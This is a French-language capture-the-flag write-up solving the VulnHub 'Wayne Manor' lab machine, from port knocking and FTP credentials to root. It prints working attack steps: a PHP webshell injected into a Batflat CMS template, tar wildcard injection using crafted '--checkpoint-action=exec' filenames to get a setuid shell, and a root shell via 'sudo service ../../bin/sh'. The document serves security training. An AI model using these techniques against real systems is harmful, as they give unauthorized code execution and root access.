# Solution du CTF Wayne Manor de VulnHub

Créé par un certain *balkan*, ce CTF téléchargeable [sur VulnHub](https://vulnhub.com/entry/wayne-manor-1,681/) est centré sur le personnage de fiction *Batman*.

La VM a des difficultés à obtenir correctement une adresse réseau, j'ai du procéder de la manière suivante :

Démarer en éditant l'entrée GRUB, ajouter un utilisateur avec les droits root (uid et gid 0), redémarrer, me connecter avec le nouvel user, lancer `dhclient`.

Il restait alors `knockd` qui avait du mal à fonctionner, il a fallut rajouter une entrée dans sa configuration pour expliciter le nom de l'interface réseau (il utilise `eth0` par défaut).

```
Nmap scan report for 192.168.56.100
Host is up (0.00024s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e4b954246c420b6430a45f57edd3a391 (RSA)
|   256 d5790cfa91fb8df2e78662c2c7888c43 (ECDSA)
|_  256 290f3405ed241af379e29799cbbca80a (ED25519)
80/tcp open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

La description du CTF indique de rajouter `waynemanor.com` dans `/etc/hosts`. Cela nous permettra d'accéder au vrai site et non à la page par défaut de Nginx.

## Some Men Just Want to Watch the World Burn

On tombe sur un blog qui fonctionne grace à un CMS nommé `Batflat`. `Wappalyzer` le détecte mais on voit aussi une mention en pied de page.

Ce qu'il faut commencer par faire est assez explicite avec 3 chiffres, le mot `Knock` et les initiales pour FTP :

> ## Knock the door in front of the mansion.
> 
> Alfred is warned to only let in about <u>300, 350, 400</u> people, but sometimes, if all those people come in, a secret room is opened, so people can **F**inish **T**he **P**arty.

On va donc port-knocker ces ports et terminer par le 21 qui devrait s'ouvrir entre temps :

```shellsession
$ ncat -z 192.168.56.100 300; ncat -z 192.168.56.100 350; ncat -z 192.168.56.100 400; ncat -v 192.168.56.100 21
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.100:21.
220 (vsFTPd 3.0.3)
```

Bingo ! Sur ce FTP on trouve un fichier texte avec des identifiants :

> Hi Bruce!  
> 
> Here are the credentials for the website (you are a bit forgetful).  
> 
> I hope you didn't find 'Port Knocking' too difficult.  
> 
> By the way, you are meeting Dick at 19:00 for coffee before the party at home.  
> 
> USER: bruce  
> PASS: alfred_help_me (Hahahahahaha)

Je trouve la section administrateur à l'URL `/admin` et je peux me connecter via ces identifiants.

Il existe une vulnérabilité pour `Batflat` qui semble être de l'injection de code PHP : [Batflat CMS 1.3.6 - Remote Code Execution (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/49573)

Mais j'ai choisis de trouver une autre méthode : le CMS propose un système de templates et en fouillant dans la documentation je vois qu'il est possible d'appeler du code PHP : [Docs - Batflat ~ lightweight, fast and easy CMS for free](https://batflat.org/docs)

Ainsi si j'édite le template de pied de page pour ajouter :

```php
{?= phpinfo() ?}
```

J'obtiens le phpinfo affiché en bas de page.

J'enchaine avec ce webshell :

```php
    <pre>{?= system($_GET["cmd"]) ?}</pre>
```

Qui me permet de rappatrier et exécuter un `reverse-ssh`. Une fois connecté je remarque que le CMS semble utiliser `sqlite` comme système de base de données (d'où le `flat` dans `Batflat` je suppose).

Pour info la base est à l'emplacement suivant mais je n'ai rien trouvé d'intéressant dedans :

```
/var/www/html/batflat/inc/data/database.sdb
```

Je passe donc à l'énumération des fichiers de `batman` sur le système :

```shellsession
www-data@waynemanor:/var/www/html/batflat$ find / -user batman -ls 2> /dev/null 
   924326   2760 -rw-rw-r--   1 batman   batman    2825216 Feb 14 12:39 /tmp/web.tar.gz
  1055614      4 drwxr-xr-x   5 batman   batman       4096 Apr 15  2021 /home/batman
  1055615      4 -rw-r--r--   1 batman   batman        220 Feb 25  2020 /home/batman/.bash_logout
  1055551      4 drwxrwxr-x   3 batman   batman       4096 Mar 26  2021 /home/batman/.local
  1055552      4 drwx------   3 batman   batman       4096 Mar 26  2021 /home/batman/.local/share
  1056105      4 -rw-r--r--   1 batman   batman        807 Feb 25  2020 /home/batman/.profile
  1056785      4 -rwx------   1 batman   batman       2117 Mar 28  2021 /home/batman/local.txt
  1049267      0 -rw-------   1 batman   batman          0 Apr 15  2021 /home/batman/.bash_history
  1055555      4 drwxrwxr-x   2 batman   batman       4096 Mar 26  2021 /home/batman/.web
  1055613      4 -rwxr-xr-x   1 batman   batman         89 Mar 26  2021 /home/batman/.web/script.sh
  1056782      4 drwx------   2 batman   batman       4096 Mar 26  2021 /home/batman/.cache
  1056784      4 -rw-rw-r--   1 batman   batman         66 Mar 26  2021 /home/batman/.selected_editor
```

Le script bash est particulièrement intéressant :

```bash
#!/bin/bash

cd /var/www/html && tar -zcf /tmp/web.tar.gz *

#TO DO: Improve the script.
```

Tout comme pour le [CTF Shuriken 1](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Shuriken%201%20de%20VulnHub.md) il est possible d'exploiter l'utilisation du wildcard et donc de créer des fichiers qui seront considérés comme des options à passer à `tar` :

```shellsession
www-data@waynemanor:/var/www/html$ echo -e '#!/usr/bin/bash\ncp /usr/bin/dash /tmp/batshell\nchmod 4755 /tmp/batshell' > evil.sh
www-data@waynemanor:/var/www/html$ chmod 755 evil.sh
www-data@waynemanor:/var/www/html$ touch -- "--checkpoint=1"
www-data@waynemanor:/var/www/html$ touch -- "--checkpoint-action=exec=sh evil.sh" 
www-data@waynemanor:/var/www/html$ touch a
```

Après une minute j'obtiens un shell setuid pour `batman` :

```
-rwsr-xr-x  1 batman   batman    129816 Feb 14 17:51 batshell
```

Et du coup le premier flag :

```shellsession
www-data@waynemanor:/var/www/html$ /tmp/batshell -p
$ id
uid=33(www-data) gid=33(www-data) euid=1000(batman) groups=33(www-data)
$ cd /home/batman
$ ls
local.txt
$ cat local.txt

I left the party... I saw the call... I had to go... Gotham City needs me...


 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::::::::-'    `-::::::::::::::::::
 ::::::::::::::::::::::::::::::::::::::::::-'          `::::::::::::::::
 :::::::::::::::::::::::::::::::::::::::-  '   /(_M_)\  `:::::::::::::::
 :::::::::::::::::::::::::::::::::::-'        |       |  :::::::::::::::
 ::::::::::::::::::::::::::::::::-         .   \/~V~\/  ,:::::::::::::::
 ::::::::::::::::::::::::::::-'             .          ,::::::::::::::::
 :::::::::::::::::::::::::-'                 `-.    .-::::::::::::::::::
 :::::::::::::::::::::-'                  _,,-::::::::::::::::::::::::::
 ::::::::::::::::::-'                _,--:::::::::::::::::::::::::::::::
 ::::::::::::::-'               _.--::::::::::::::::::::::#####:::::::::
 :::::::::::-'             _.--:::::::::::::::::::::::::::#####:::::####
 ::::::::'    ##     ###.-::::::###:::::::::::::::::::::::#####:::::####
 ::::-'       ###_.::######:::::###::::::::::::::#####:##########:::####
 :'         .:###::########:::::###::::::::::::::#####:##########:::####
      ...--:::###::########:::::###:::::######:::#####:##########:::####
  _.--:::##:::###:#########:::::###:::::######:::#####:#################
 '#########:::###:#########::#########::######:::#####:#################
 :#########:::#############::#########::######:::#######################
 ##########:::########################::################################
 ##########:::##########################################################
 ##########:::##########################################################
 #######################################################################
 #######################################################################
 #################################################################### ##
 #######################################################################

          
                   ec0e2603172c73a8b644bb9456c1ff6e
```

On peut déposer notre clé publique SSH dans le `authorized_keys` pour avoir un accès moins restreint.

## Bat Escalade de privilèges

`Batman` peut exécuter la commande `service` en tant que root, sans mot de passe :

```shellsession
batman@waynemanor:~$ sudo -l
Matching Defaults entries for batman on waynemanor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User batman may run the following commands on waynemanor:
    (root) NOPASSWD: /usr/sbin/service
```

Sur GTFObins on trouve une entrée pour cette commande système :

```shellsession
batman@waynemanor:~$ sudo /usr/sbin/service ../../bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
proof.txt  snap
# cat proof.txt 

Rescue a cat? Unbelievable, I had to leave that journalist who works at 'The Gotham Times' for this animal...

Well... I'll have to get back to the party, Alfred needs me.


                 T\ T\
                 | \| \
                 |  |  :
            _____I__I  |
          .'            '.
        .'                '
        |   ..             '
        |  /__.            |
        :.' -'             |
       /__.                |
      /__, \               |
         |__\        _|    |
         :  '\     .'|     |
         |___|_,,,/  |     |    _..--.
      ,--_-   |     /'      \../ /  /\\
     ,'|_ I---|    7    ,,,_/ / ,  / _\\
   ,-- 7 \|  / ___..,,/   /  ,  ,_/   '-----.
  /   ,   \  |/  ,____,,,__,,__/            '\
 ,   ,     \__,,/                             |
 | '.       _..---.._                         !.
 ! |      .'  _ __ . '.                        |
 .:'      | (-_ _--')  :          L            !
 .'.       '.  Y    _.'             \,         :
  .          '-----'                 !          .
  .           /  \                   .          .



    34d1f91fb2e514b8576fab1a75a89a6b


***************************************************************************************************************************

Congratulations for compromising my first vulnerable machine!

You can follow me on Twitter (@sec_balkan), in GitHub (@sec-balkan) or send me a message on Telegram (@sec_balkan).

Thank you!
```

*Publié le 14 février 2023*
